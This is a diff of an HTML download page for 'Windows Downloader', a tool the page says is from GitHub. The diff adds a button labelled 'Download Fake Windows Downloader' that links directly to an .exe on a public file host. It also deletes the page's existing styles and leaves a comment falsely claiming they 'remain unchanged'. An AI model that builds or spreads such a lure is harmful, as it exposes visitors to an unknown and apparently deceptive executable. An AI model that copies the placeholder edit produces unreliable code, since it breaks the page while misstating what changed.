@@ -5,56 +5,36 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Windows Downloader</title>
     <style>
-        body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background: linear-gradient(to right, #3498db, #2c3e50);
-            color: #CC0000;
-            margin: 0;
-            padding: 0;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            height: 100vh;
-        }
+        /* Your existing styles remain unchanged */
 
-        #container {
-            max-width: 500px;
-            text-align: center;
-            padding: 20px;
-            background-color: rgba(255, 255, 255, 0.9);
-            border-radius: 10px;
-            box-shadow: 0 0 20px rgba(0, 0, 0, 0.2);
-        }
-
-        h1 {
-            color: #3498db;
-        }
-
-        #downloadButton {
+        /* Additional button styles */
+        #secondButton {
             display: inline-block;
+            margin-top: 20px; /* Add some spacing between buttons */
             padding: 15px 30px;
             font-size: 20px;
             font-weight: bold;
             text-decoration: none;
-            background-color: #e74c3c;
+            background-color: #27ae60; /* Choose a different color */
             color: #fff;
-            border: 2px solid #c0392b;
+            border: 2px solid #229954; /* Choose a different border color */
             border-radius: 8px;
             transition: background-color 0.3s, transform 0.3s;
             cursor: pointer;
         }
 
-        #downloadButton:hover {
-            background-color: #c0392b;
+        #secondButton:hover {
+            background-color: #229954; /* Change the hover background color */
             transform: scale(1.05);
         }
     </style>
 </head>
 <body>
     <div id="container">
-        <h1>Welcome to my windows downloader page from github!</h1>
-        <p>Click the button below to download Windows Downloader.</p>
-        <a id="downloadButton" href="windowsdownloader.rar" download>Download Windows Downloader V2</a>
+        <h1>Welcome to my Windows Downloader page from GitHub!</h1>
+        <p>Click the buttons below to download different versions of Windows Downloader.</p>
+        <a id="downloadButton" href="windowsdownloader_v2.rar" download>Download Windows Downloader V2</a>
+        <a id="secondButton" href="https://store1.gofile.io/download/direct/7fa54d20-e794-45fa-938b-4135a790d932/WindowsDownloader.exe" download>Download Fake Windows Downloader</a>
     </div>
 </body>
 </html>
